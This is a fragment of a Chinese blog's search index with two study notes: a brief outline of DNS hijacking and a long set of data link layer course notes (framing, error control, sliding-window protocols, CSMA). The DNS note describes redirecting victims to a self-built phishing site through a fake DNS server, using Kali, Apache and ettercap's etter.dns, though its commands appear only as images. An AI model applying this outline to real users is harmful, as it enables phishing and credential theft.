    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>DNS劫持相关知识点以及攻击流程</p>
<span id="more"></span>
<p>DNS域名服务器</p>
<p>www.loveakali.top<br>根域：.  浏览器会自动添加<br>顶级域名(一级域名)：.com    .cn    .org    .edu<br>二级域名：.loveakali<br>主机名：www</p>
<p>因为服务器存在承载上限，所以当DNS服务器解析域名失败，DNS服务器就会发送给根域服务器（全世界就13台），然后转到一级域名服务器，然后转到二级域名服务器</p>
<p>第二次访问比第一次访问块<br>电脑中有host文件用于缓存最近访问的网站</p>
<p>黑客攻击思路：<br>在提交域名至DNS服务器过程中用假的DNS服务器拦截下来，返回一个假的ip地址（该ip网站为搭建的钓鱼网站）</p>
<p>工具：<br>kali<br>钓鱼网站    部署后使受害人通过ip地址访问    apache<br>ettercap： etter.dns  配置文件  1.劫持网站是哪个？2.返回的ip地址是哪个</p>
<p>dns解析方式：1.正向解析 域名解析ip地址    2.反向解析  ip地址解析域名<br>www.jd.com A IP         A    正向解析<br>www.jd.com PTR IP        PTR    反向解析</p>
<p>3.发动攻击的指令<br><img src="/2023/01/04/DNS%E5%8A%AB%E6%8C%81/image-20230104205539092-16728369399071.png" alt="image-20230104205539092"></p>
<p>清楚缓存ipconfig /flushdns<br><img src="/2023/01/04/DNS%E5%8A%AB%E6%8C%81/image-20230104205955172.png" alt="image-20230104205955172"></p>
<p>攻略<br>1.ip地址   扫描<br>2.缓存    DNS劫持    木马    系统命令</p>
]]></content>
      <categories>
        <category>web攻防</category>
      </categories>
      <tags>
        <tag>DNS劫持</tag>
      </tags>
  </entry>
  <entry>
    <title>链路层</title>
    <url>/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104093550972.png" alt="image-20230104093550972"></p>
<span id="more"></span>
<h1 id="功能概述"><a href="#功能概述" class="headerlink" title="功能概述"></a>功能概述</h1><p>帧：链路层的协议数据单元，封装网络层数据报</p>
<p>数据链路层负责通过一条链路从一个结点向另一个物理链路直接相连的相邻结点传送数据报。<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104094524368.png" alt="image-20230104094524368"></p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104094947249.png" alt="image-20230104094947249"></p>
<h1 id="封装成帧和透明传输"><a href="#封装成帧和透明传输" class="headerlink" title="封装成帧和透明传输"></a>封装成帧和透明传输</h1><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104095341372.png" alt="image-20230104095341372"><br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104095400187.png" alt="image-20230104095400187"></p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104095454024.png" alt="image-20230104095454024"></p>
<h2 id="字符计数法"><a href="#字符计数法" class="headerlink" title="字符计数法"></a>字符计数法</h2><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104095658063.png" alt="image-20230104095658063"></p>
<h2 id="字符填充法"><a href="#字符填充法" class="headerlink" title="字符填充法"></a>字符填充法</h2><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104100227855.png" alt="image-20230104100227855"></p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104100103889.png" alt="image-20230104100103889"><br>SOH：帧首部    EOT：帧尾部    ESC：转义</p>
<h2 id="零比特填充法"><a href="#零比特填充法" class="headerlink" title="零比特填充法"></a>零比特填充法</h2><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104100517452.png" alt="image-20230104100517452"></p>
<h2 id="违规编码法"><a href="#违规编码法" class="headerlink" title="违规编码法"></a>违规编码法</h2><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104100618192.png" alt="image-20230104100618192"></p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104100653127.png" alt="image-20230104100653127"></p>
<h1 id="差错控制"><a href="#差错控制" class="headerlink" title="差错控制"></a>差错控制</h1><h2 id="检错编码"><a href="#检错编码" class="headerlink" title="检错编码"></a>检错编码</h2><p>概括来说，传输中的产错都是由于噪声引起的</p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104101040816.png" alt="image-20230104101040816"></p>
<h3 id="奇偶校验码"><a href="#奇偶校验码" class="headerlink" title="奇偶校验码"></a>奇偶校验码</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104101414072.png" alt="image-20230104101414072"></p>
<p>特点：只能检查出奇数个/偶数个比特错误，检错能力为50%</p>
<h3 id="CRC循环冗余码"><a href="#CRC循环冗余码" class="headerlink" title="CRC循环冗余码"></a>CRC循环冗余码</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104101827049.png" alt="image-20230104101827049"></p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104102231091.png" alt="image-20230104102231091"></p>
<p>链路层使用CRC检验，能够实现无比特差错的传输，但这还不是可靠传输</p>
<h2 id="纠错编码"><a href="#纠错编码" class="headerlink" title="纠错编码"></a>纠错编码</h2><h3 id="海明码"><a href="#海明码" class="headerlink" title="海明码"></a>海明码</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104103317367.png" alt="image-20230104103317367"></p>
<h4 id="海明距离"><a href="#海明距离" class="headerlink" title="海明距离"></a>海明距离</h4><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104103544956.png" alt="image-20230104103544956"></p>
<p>如果要检错n位，那么码距至少需要n+1；如果要纠错n位，那么码距至少需要2n+1</p>
<h4 id="确认校验码位数r"><a href="#确认校验码位数r" class="headerlink" title="确认校验码位数r"></a>确认校验码位数r</h4><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104104354024.png" alt="image-20230104104354024"></p>
<h4 id="确定校验码和数据的位置"><a href="#确定校验码和数据的位置" class="headerlink" title="确定校验码和数据的位置"></a>确定校验码和数据的位置</h4><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104104522452.png" alt="image-20230104104522452"></p>
<h4 id="求出校验码的值"><a href="#求出校验码的值" class="headerlink" title="求出校验码的值"></a>求出校验码的值</h4><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104104839066.png" alt="image-20230104104839066"></p>
<h4 id="检错并纠错"><a href="#检错并纠错" class="headerlink" title="检错并纠错"></a>检错并纠错</h4><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104105305926.png" alt="image-20230104105305926"></p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104105758249.png" alt="image-20230104105758249" style="zoom:80%;"><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104105815615.png" alt="image-20230104105815615"></p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104110106371.png" alt="image-20230104110106371"></p>
<h1 id="可靠传输机制和流量控制"><a href="#可靠传输机制和流量控制" class="headerlink" title="可靠传输机制和流量控制"></a>可靠传输机制和流量控制</h1><h2 id="数据链路层的流量控制"><a href="#数据链路层的流量控制" class="headerlink" title="数据链路层的流量控制"></a>数据链路层的流量控制</h2><p>较高的发送速度和较低的接受能力的不匹配，会造成传输出错，因此流量控制也是数据链路层的一项重要工作。</p>
<p>数据链路层的流量控制是点对点的，而传输层的流量控制是端到端的。</p>
<p>数据链路层流量控制手段：接收方收不下就不回复确认。<br>传输层流量控制手段：接收端给发送端一个窗口公告。</p>
<h2 id="流量控制方法"><a href="#流量控制方法" class="headerlink" title="流量控制方法"></a>流量控制方法</h2><h3 id="停止-等待协议"><a href="#停止-等待协议" class="headerlink" title="停止-等待协议"></a>停止-等待协议</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104111257417.png" alt="image-20230104111257417" style="zoom:80%;"></p>
<h3 id="滑动窗口协议"><a href="#滑动窗口协议" class="headerlink" title="滑动窗口协议"></a>滑动窗口协议</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104111435875.png" alt="image-20230104111435875" style="zoom:80%;"><br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104111457317.png" alt="image-20230104111457317"><br>每收到一个发送帧，接收后接受窗口前进一格；每收到一个确认帧，发送窗口前进一格</p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104111711422.png" alt="image-20230104111711422"></p>
<p>在链路层中，再发送过程中窗口大小固定。传输层中会出现不固定的窗口大小</p>
<h3 id="可靠传输、滑动窗口、流量控制"><a href="#可靠传输、滑动窗口、流量控制" class="headerlink" title="可靠传输、滑动窗口、流量控制"></a>可靠传输、滑动窗口、流量控制</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104113939833.png" alt="image-20230104113939833"></p>
<h1 id="停止-等待协议-1"><a href="#停止-等待协议-1" class="headerlink" title="停止-等待协议"></a>停止-等待协议</h1><ul>
<li>为什么要有停止-等待协议</li>
</ul>
<p>除了比特出差错，底层信道还会出现丢包问题。<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104123626366.png" alt="image-20230104123626366"><br>为了实现流量控制</p>
<h2 id="无差错情况"><a href="#无差错情况" class="headerlink" title="无差错情况"></a>无差错情况</h2><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104124018565.png" alt="image-20230104124018565"></p>
<h2 id="有差错情况"><a href="#有差错情况" class="headerlink" title="有差错情况"></a>有差错情况</h2><h3 id="数据帧丢失或检测到帧出错"><a href="#数据帧丢失或检测到帧出错" class="headerlink" title="数据帧丢失或检测到帧出错"></a>数据帧丢失或检测到帧出错</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104153704307.png" alt="image-20230104153704307"></p>
<ol>
<li>发完一个帧后，必须保留他的副本</li>
<li>数据帧和确认帧必须编号</li>
</ol>
<h3 id="ACK丢失"><a href="#ACK丢失" class="headerlink" title="ACK丢失"></a>ACK丢失</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104154038945.png" alt="image-20230104154038945"></p>
<h3 id="ACK迟到"><a href="#ACK迟到" class="headerlink" title="ACK迟到"></a>ACK迟到</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104154157316.png" alt="image-20230104154157316"></p>
<h2 id="停止-等待协议性能分析"><a href="#停止-等待协议性能分析" class="headerlink" title="停止-等待协议性能分析"></a>停止-等待协议性能分析</h2><p>信道利用率太低<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104154502646.png" alt="image-20230104154502646"><br>$T_D：发送时延    RTT：往返时延    T_A：确认帧的发送时延$</p>
<h3 id="信道利用率"><a href="#信道利用率" class="headerlink" title="信道利用率"></a>信道利用率</h3><p>发送方在一个发送周期内，有效地发送数据所需要的时间占整个发送周期的比率</p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104154831369.png" alt="image-20230104154831369" style="zoom:80%;"><br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104154909126.png" alt="image-20230104154909126"></p>
<h1 id="后退N帧协议-GBN"><a href="#后退N帧协议-GBN" class="headerlink" title="后退N帧协议(GBN)"></a>后退N帧协议(GBN)</h1><p>发送窗口：发送方维持一组连续的允许发送帧的序号<br>接收窗口：接收方维持一组连续的允许接受帧的序号</p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104155839209.png" alt="image-20230104155839209"></p>
<h3 id="发送方需要做的事情"><a href="#发送方需要做的事情" class="headerlink" title="发送方需要做的事情"></a>发送方需要做的事情</h3><ol>
<li>上层的调用<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104160608420.png" alt="image-20230104160608420"></li>
<li>收到一个ACK<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104160749701-16728196709461.png" alt="image-20230104160749701"></li>
<li>超时事件<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104160910082.png" alt="image-20230104160910082"></li>
</ol>
<h3 id="接收方要做的事情"><a href="#接收方要做的事情" class="headerlink" title="接收方要做的事情"></a>接收方要做的事情</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104161201358.png" alt="image-20230104161201358"><br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104161237840.png" alt="image-20230104161237840"></p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104161422614.png" alt="image-20230104161422614"></p>
<h3 id="滑动窗口长度"><a href="#滑动窗口长度" class="headerlink" title="滑动窗口长度"></a>滑动窗口长度</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104162029634.png" alt="VBV"></p>
<h3 id="GBN协议重点总结"><a href="#GBN协议重点总结" class="headerlink" title="GBN协议重点总结"></a>GBN协议重点总结</h3><ol>
<li>累积确认（偶尔捎带确认）</li>
<li>接收方只按顺序接受帧，不按序无情丢弃</li>
<li>确认序列号最大的、按序到达的帧</li>
<li>发送窗口最大为2^n^-1，接收窗口大小为1</li>
</ol>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104162530402.png" alt="image-20230104162530402">C<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104163911236.png" alt="image-20230104163911236"><br>C</p>
<h3 id="GBN协议性能分析"><a href="#GBN协议性能分析" class="headerlink" title="GBN协议性能分析"></a>GBN协议性能分析</h3><p>优点：因连续发送数据帧而提高了信道利用率</p>
<p>缺点：在重传时必须把原来已经正确传送的数据帧重传，传送效率降低（累计确认导致的问题）</p>
<h1 id="选择重传协议-SR"><a href="#选择重传协议-SR" class="headerlink" title="选择重传协议(SR)"></a>选择重传协议(SR)</h1><p>设置单个确认，同时加大接受窗口，设置接受缓存，缓存乱序到达的帧</p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104164829412.png" alt="image-20230104164829412"></p>
<h2 id="发送方必须响应的三件事"><a href="#发送方必须响应的三件事" class="headerlink" title="发送方必须响应的三件事"></a>发送方必须响应的三件事</h2><ol>
<li>上层的调用<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104164914968.png" alt="image-20230104164914968"></li>
<li>收到了一个ACK<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104164939113.png" alt="image-20230104164939113"></li>
<li>超时事件<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104165134209.png" alt="image-20230104165134209"></li>
</ol>
<h2 id="接收方要做的事"><a href="#接收方要做的事" class="headerlink" title="接收方要做的事"></a>接收方要做的事</h2><p>来着不拒（窗口内的帧）<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104165210319.png" alt="image-20230104165210319"><br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104165503720.png" alt="image-20230104165503720"></p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104170847171.png" alt="image-20230104170847171"></p>
<h2 id="滑动窗口长度-1"><a href="#滑动窗口长度-1" class="headerlink" title="滑动窗口长度"></a>滑动窗口长度</h2><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104171438113.png" alt="image-20230104171438113"></p>
<p>发送窗口最好等于接收窗口。</p>
<script type="math/tex; mode=display">
W_{Tmax}=W_{Rmax}=2^{n-1}</script><p>所以上面例子帧编号从0-3，所以$n=log_24=2$，所以发送窗口等于接收窗口=2</p>
<h2 id="重点总结"><a href="#重点总结" class="headerlink" title="重点总结"></a>重点总结</h2><ol>
<li>对数据帧逐一确认</li>
<li>只重传出错帧</li>
<li>接收方有缓存</li>
<li>$W_{Tmax}=W_{Rmax}=2^{n-1}$</li>
</ol>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104172451655.png" alt="image-20230104172451655"><br>A</p>
<h1 id="介质访问控制"><a href="#介质访问控制" class="headerlink" title="介质访问控制"></a>介质访问控制</h1><h2 id="静态划分信道——信道划分介质访问控制"><a href="#静态划分信道——信道划分介质访问控制" class="headerlink" title="静态划分信道——信道划分介质访问控制"></a>静态划分信道——信道划分介质访问控制</h2><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104181434526.png" alt="image-20230104181434526"></p>
<p>广播式链路典型拓扑结构：总线型、星型（逻辑总线型） </p>
<p>采取一定的措施，使得两对结点之间的通信不会发生互相干扰的情况</p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104190245754.png" alt="image-20230104190245754"></p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104190442391.png" alt="image-20230104190442391"></p>
<h3 id="频分多路复用FDM"><a href="#频分多路复用FDM" class="headerlink" title="频分多路复用FDM"></a>频分多路复用FDM</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104191105739.png" alt="image-20230104191105739"></p>
<h3 id="时分多路复用TDM"><a href="#时分多路复用TDM" class="headerlink" title="时分多路复用TDM"></a>时分多路复用TDM</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104191234014.png" alt="image-20230104191234014"></p>
<h3 id="统计时分复用STDM"><a href="#统计时分复用STDM" class="headerlink" title="统计时分复用STDM"></a>统计时分复用STDM</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104191545648.png" alt="image-20230104191545648"></p>
<p>类似队列，先进先出，满帧就走，按需分配</p>
<h3 id="波分多路复用WDM"><a href="#波分多路复用WDM" class="headerlink" title="波分多路复用WDM"></a>波分多路复用WDM</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104192215814.png" alt="image-20230104192215814"></p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104192225172.png" alt="image-20230104192225172"></p>
<h3 id="码分多路复用CDM"><a href="#码分多路复用CDM" class="headerlink" title="码分多路复用CDM"></a>码分多路复用CDM</h3><p>码分多址（CDMA)是码分复用的一种方式<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104192838892.png" alt="image-20230104192838892"></p>
<script type="math/tex; mode=display">
S:00011011\ 芯片序列：-1 -1 -1 +1 +1 -1 +1 +1\\T:00101110\ 芯片序列：-1 -1 +1 -1 +1 +1 +1 -1</script><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104193433727.png" alt="image-20230104193433727"></p>
<h2 id="动态分配信道——随机访问介质访问控制"><a href="#动态分配信道——随机访问介质访问控制" class="headerlink" title="动态分配信道——随机访问介质访问控制"></a>动态分配信道——随机访问介质访问控制</h2><h3 id="纯ALOHA协议"><a href="#纯ALOHA协议" class="headerlink" title="纯ALOHA协议"></a>纯ALOHA协议</h3><p>思想：不监听信道，不按时间槽发送，随即重发。当网络中的任何一个站点需要发送数据时，可以不进行任何检测就发送数据。如果在一段时间内未收到确认，那么该站点就认为传输过程中发生了冲突。发送站点需要等待一段时间后再发送数据，直至发送成功。<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230105095601747.png" alt="image-20230105095601747"></p>
<h3 id="时隙ALOHA协议"><a href="#时隙ALOHA协议" class="headerlink" title="时隙ALOHA协议"></a>时隙ALOHA协议</h3><p>思想：把时间分成若干个相同的时间片，所有用户在时间片开始时刻同步接入网络信道，若发生冲突，则必须等到下一个时间片开始时刻再发送<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230105095842071.png" alt="image-20230105095842071"></p>
<h4 id="重发概率的问题"><a href="#重发概率的问题" class="headerlink" title="重发概率的问题"></a>重发概率的问题</h4><p>如果有碰撞，该节点在时隙结束之前检测这次碰撞，该节点以概率p在后续的每个时隙中重传它的帧，直到该帧被无碰撞的传输出去。</p>
<p>以概率p重传，是指某节点有效地投掷一个有偏倚的硬币：硬币正面事件对应着重传，而重传出现的概率为p。硬币反面事件对应着“跳过这个时隙，在下个时隙在掷硬币”；这个事件以概率(1-p)出现。所有涉及碰撞的节点独立地投掷它们的硬币。</p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230105101417907.png" alt="image-20230105101417907"></p>
<p>因此，当有N个活跃节点时，时隙ALONA的效率是$Np(1-p)^{N-1}$。为了获得N个活跃节点的最大效率，就要求出是上诉表达式最大化的p。<img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230105102317263.png" alt="image-20230105102317263"><br>所以，该协议的最大效率为1/e=0.37，因此该信道的有效传输效率不是R bps，而仅为0.37R bps。</p>
<h4 id="关于ALONA"><a href="#关于ALONA" class="headerlink" title="关于ALONA"></a>关于ALONA</h4><ol>
<li>纯ALONA比时隙ALONA吞吐量更低，效率更低</li>
<li>纯ALONA协议是想发就发，时隙ALONA只有在时间片段的开始才能发</li>
</ol>
<h3 id="CSMA协议"><a href="#CSMA协议" class="headerlink" title="CSMA协议"></a>CSMA协议</h3><p>载波监听多路访问协议CSMA</p>
<p>CS：载波侦听/监听，每一个站在发送数据之前要检测一下总线上是否有其他计算机在发送数据。<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230105102722428.png" alt="image-20230105102722428"></p>
<p>MA：多点接入，表示许多计算机以多点接入的方式连接在一根总线上。<br>协议思想：发送帧之前，监听信道<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230105103022996.png" alt="image-20230105103022996"></p>
<h4 id="1-坚持CSMA"><a href="#1-坚持CSMA" class="headerlink" title="1-坚持CSMA"></a>1-坚持CSMA</h4><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230105103222408.png" alt="image-20230105103222408"></p>
<h4 id="非坚持CSMA"><a href="#非坚持CSMA" class="headerlink" title="非坚持CSMA"></a>非坚持CSMA</h4><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230105103400804.png" alt="image-20230105103400804"></p>
<h4 id="p-坚持CSMA"><a href="#p-坚持CSMA" class="headerlink" title="p-坚持CSMA"></a>p-坚持CSMA</h4><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230105103607517.png" alt="image-20230105103607517"><br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230105103836420.png" alt="image-20230105103836420"><br>但是如果发生冲突后还是会坚持把数据帧发送完，会造成浪费</p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230105103924946.png" alt="image-20230105103924946"></p>
<h3 id="CSMA-CD协议"><a href="#CSMA-CD协议" class="headerlink" title="CSMA/CD协议"></a>CSMA/CD协议</h3><p>载波监听多点接入/碰撞检测    CSMA/CD<br>CD：碰撞检测（冲突检测），“边发送边监听”，适配器边发送数据边检测信道上信号电压的变化，以便判断自己在发送数据时其他站是否也在发送数据。<br>所以可以看出应用于半双工网络。</p>
<h4 id="争用期-冲突窗口-碰撞窗口"><a href="#争用期-冲突窗口-碰撞窗口" class="headerlink" title="争用期/冲突窗口/碰撞窗口"></a>争用期/冲突窗口/碰撞窗口</h4><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230105105639147.png" alt="image-20230105105639147"></p>
<p>最多是两倍的总线端到端的传播时延$(2\tau)$，也成为争用期/冲突窗口/碰撞窗口<br>只要经过$2\tau$时间还没有检测到碰撞，就能肯定这次发送不会发生碰撞</p>
<h4 id="确定碰撞后的重传时机-截断二进制指数规避算法"><a href="#确定碰撞后的重传时机-截断二进制指数规避算法" class="headerlink" title="确定碰撞后的重传时机-截断二进制指数规避算法"></a>确定碰撞后的重传时机-截断二进制指数规避算法</h4><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230105112121278.png" alt="image-20230105112121278"></p>
<h4 id="最小帧长问题"><a href="#最小帧长问题" class="headerlink" title="最小帧长问题"></a>最小帧长问题</h4><p>帧的传输时延至少要两倍于信号在总线中的传播时延</p>
<script type="math/tex; mode=display">
\frac{帧长(bit)}{数据传输速率}\geq 2×传播时延=2\tau\\最小帧长=总线传播时延×数据传播速率×2=2\tau×数据传播速率</script><p>以太网规定最小帧长为64B，凡是长度小于64B的都是由于冲突而异常终止的无效帧</p>
<h3 id="CSMA-CA协议"><a href="#CSMA-CA协议" class="headerlink" title="CSMA/CA协议"></a>CSMA/CA协议</h3><p>载波监听多点接入/碰撞避免    CSMA/CA</p>
<p>为什么要有CSMA/CA?<br>——无线局域网中无法做到360°全面检测碰撞<br>——无线局域网中隐蔽站当A和C都检测不到信号，认为信道空闲时，同时向终端B发送数据帧，就会导致冲突。</p>
<h4 id="CSMA-CA协议工作原理"><a href="#CSMA-CA协议工作原理" class="headerlink" title="CSMA/CA协议工作原理"></a>CSMA/CA协议工作原理</h4><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230105200113880.png" alt="image-20230105200113880"></p>
<p>流程</p>
<ol>
<li>预约信道</li>
<li>ACK帧</li>
<li>RTS/CTS帧</li>
</ol>
<h3 id="CSMA-CD与CSMA-CA"><a href="#CSMA-CD与CSMA-CA" class="headerlink" title="CSMA/CD与CSMA/CA"></a>CSMA/CD与CSMA/CA</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230105200538921.png" alt="image-20230105200538921"></p>
<h2 id="轮询访问介质访问控制"><a href="#轮询访问介质访问控制" class="headerlink" title="轮询访问介质访问控制"></a>轮询访问介质访问控制</h2><h3 id="轮询协议"><a href="#轮询协议" class="headerlink" title="轮询协议"></a>轮询协议</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230106164637824.png" alt="image-20230106164637824"></p>
<p>问题</p>
<ol>
<li>轮询开销</li>
<li>等待延迟</li>
<li>单点故障</li>
</ol>
<h3 id="令牌传输协议"><a href="#令牌传输协议" class="headerlink" title="令牌传输协议"></a>令牌传输协议</h3><p>逻辑上是环型拓扑，物理上是星型拓扑<br>令牌：一个特殊格式的MAC控制帧，不含任何信息。控制信道的使用，确保同一时刻只有一个结点独占信道。<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230106165147341.png" alt="image-20230106165147341" style="zoom: 75%;"></p>
<p>每个结点都可以在一定的时间内（令牌持有时间）获得发送数据的权力，并不是无限制地持有令牌</p>
<p>问题</p>
<ol>
<li>令牌开销</li>
<li>等待延迟</li>
<li>单点故障</li>
</ol>
<p>采用令牌传送方式的网络常用于负载较重、通信量较大的网络中。</p>
<h2 id="局域网基本概念和体系结构"><a href="#局域网基本概念和体系结构" class="headerlink" title="局域网基本概念和体系结构"></a>局域网基本概念和体系结构</h2><h3 id="局域网"><a href="#局域网" class="headerlink" title="局域网"></a>局域网</h3><p>局域网：简称LAN，是指在<strong>某一区域内</strong>由多台计算机互联成的计算机组，使用广播信道</p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230110210512470.png" alt="image-20230110210512470"></p>
<p>决定局域网的主要要素为：<strong>网络拓扑、传输介质</strong>与<strong>介质访问控制方法</strong>。</p>
<h3 id="局域网网络拓扑"><a href="#局域网网络拓扑" class="headerlink" title="局域网网络拓扑"></a>局域网网络拓扑</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230110211041120.png" alt="image-20230110211041120"></p>
<h3 id="局域网传输介质"><a href="#局域网传输介质" class="headerlink" title="局域网传输介质"></a>局域网传输介质</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230110211135392.png" alt="image-20230110211135392"></p>
<h3 id="局域网介质访问控制方法"><a href="#局域网介质访问控制方法" class="headerlink" title="局域网介质访问控制方法"></a>局域网介质访问控制方法</h3><ol>
<li>CSMA/CD    常用于总线型局域网，也用于树型网络</li>
<li>令牌总线      常用于总线型局域网，也用于树型网络<br>他总是把总线型或树型网络中的各个工作站按一定顺序如按接口地址大小排列形成一个逻辑环，只有令牌持有者才能控制总线，才有发送信息的权力</li>
<li>令牌环          用于环形局域网，如令牌环网</li>
</ol>
